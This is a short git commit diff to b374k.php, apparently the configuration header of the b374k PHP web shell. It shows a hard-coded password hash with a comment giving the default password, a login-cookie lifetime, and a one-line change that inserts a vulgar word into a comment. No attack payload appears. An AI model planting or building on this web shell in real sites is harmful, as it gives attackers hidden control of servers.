450687a71fae9c17d4bf41637dcf2092f38a0735
M3d <43959128+medcoli@users.noreply.github.com>
2020-06-08 03:24:38 +0700

    Update b374k.php

--- shell/php/b374k.php
+++ shell/php/b374k.php
@@ -5,7 +5,7 @@ $s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // default password : b374
 $s_ver = "2.8"; // shell ver
 $s_title = "b374k ".$s_ver; // shell title
 $s_login_time = 3600 * 24 * 7; // cookie time (login)
-$s_debug = false; // debugging mode
+$s_debug = false; // deKONTOLbugging mode
 
 @ob_start();
 @set_time_limit(0);
